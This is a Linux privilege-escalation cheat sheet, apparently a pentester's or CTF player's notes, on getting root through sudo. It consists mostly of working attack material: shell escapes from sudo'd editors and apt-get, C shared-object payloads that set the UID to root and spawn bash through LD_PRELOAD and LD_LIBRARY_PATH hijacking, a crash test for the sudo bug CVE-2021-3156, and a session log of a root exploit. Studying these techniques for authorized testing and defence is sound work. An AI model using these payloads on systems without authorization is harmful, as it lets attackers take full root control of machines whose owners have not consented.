# Sudo

* [Enumerate](#enumerate)
* [Limited Sudo](#limited-sudo)
* [LD_PRELOAD](#ld_preload)
* [LD_LIBRARY_PATH](#ld_library_path)
* [Sudo Exploits](#sudo-exploits)
* [pkexec](#pkexec)

## Enumerate

If you can read `/etc/sudoers`, then do so to figure out the sudo permissions of users on the machine.

Otherwise check sudo privileges (often requires password):
```bash
sudo -l
```

Execute as another user:
```bash
# impersonate another user with sudo
sudo -u <user> <command>
sudo -u someuser whoami

# shell as another user
sudo -u someuser /bin/bash
```

Root shell (one of these):
```bash
# gain root through sudo
sudo su -

# keep current environment when switching to root
sudo su

# alternative ways to elevate to root
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

## Limited Sudo

If your sudo privileges are restricted to some specific programs, then look for possible escape methods:

**GTFOBins** - https://gtfobins.github.io/

### Examples

In text editors like `less` or `more` you can often open a shell via the interactive command interface in the editor:
```bash
less <somefile>
!/bin/sh
# spawns root sh shell
```

Vi and Vim:
```bash
sudo vi
:set shell=/bin/sh
:shell
# spawns root sh shell
```

Emacs:
```bash
sudo emacs -Q -nw --eval '(term "/bin/sh")'
# spawns root sh shell
```

A lot of edtiors that normally aren't interactive will drop into an interactive mode if the window size is too small, so try lowering the windows size if you cannot access commands.

### apt-get

This is an example of using the above indirectly, which can be quite common in different applications. Look for ways to make a sudo'd application run a pager like less.

The default pager should be `less' for this to work. Also you need to find an updated apt package that has a changelog.

```bash
sudo apt-get changelog apt
...
!/bin/sh
# spawns root sh shell
```

## LD_PRELOAD

If you do sudo -l and see the following:
```bash
env_keep+=LD_PRELOAD
```

Then you can easily PrivEsc to root.

Create a shared object (.so) binary:

File `pe_preload.c`:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Compile:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pe_preload.so pe_preload.c
```

Now if you run any program as sudo, you can pop a root shell:

```bash
sudo LD_PRELOAD=/tmp/pe_preload.so ping

# root shell pops
```


## LD_LIBRARY_PATH

Unlike LD_PRELOAD, this is not an unconditional winning condidtion. This will work if the program you can execute uses one or more shared libraries.

If you do sudo -l and see the following:
```bash
env_keep+=LD_LIBRARY_PATH
```

Then you might be able to gain root by replacing a shared object library (.so) used by one of the programs we can run as sudo.

Use the `ldd` command to enumerate the shared object libraries used by a binary.

```bash
ldd /usr/sbin/apache2

# output
    ...
    librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007fa9e2b33000)
    libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fa9e2af8000)
    libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa9e2af3000)
    ...
```

If there are libs, then this should work. Pick one of them and create a shared library binary with the same name (here libcrypt.so.1).

pe_lib.c:

```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Compile like the previous example:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC pe_lib.c
cd /tmp/
```

Then run the relevant command with the LD_LIBRARY_PATH parameter:

```bash
sudo LD_LIBRARY_PATH=. apache2

# rootshell spawns here
```

## Sudo Exploits

All of the above are basically ways to use sudo as intended by the creators (it's not a bug, it's a feature). But there were also a variety of vulnerabilities in sudo itself over the years.

Enumerate the sudo version with:

```bash
sudo -V
```

Search for exploits:
```bash
searchsploit sudo
searchsploit sudo <version_num_here>
```

There is also a dedicated toolset for identifying sudo vulnerabilities:

* "sudo killer" by TH3xACE - https://github.com/TH3xACE/SUDO_KILLER



### CVE-2021-3156 - Baron Samedit

Test for sudo vulnerability 

sudoedit -s '\' `perl -e 'print "A" x 65536'`
sudoedit -s '\' `python3 -c 'print("A" * 65536)'`


If the result is a memory corruption error, then the machine is vulnerable

```bash
malloc(): corrupted top size
Aborted
```

https://github.com/worawit/CVE-2021-3156

```bash
shaun@doctor:/tmp/blub/CVE-2021-3156$ python3 exploit_nss.py
python3 exploit_nss.py
# whoami
whoami
root

```


## pkexec

Pkexec is similar to sudo, in that it lets you execute commands as another user (usually root) if you are part of a whitelisted group (usually 'admin' or similar).

If there is the pkexec SUID binary on the machine (check the SUID notes for search commands), then check the config:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

If one of your groups is listed there then you can do:

```bash
pkexec "/bin/sh" #You will be prompted for your user password

# root shell pops here
```

## doas

If you can't run su or sudo and you cannot elevate despite having the root password, then sometimes you can find this (especially on BSD):

```bash
doas -u root /bin/sh 
# type root password here
```




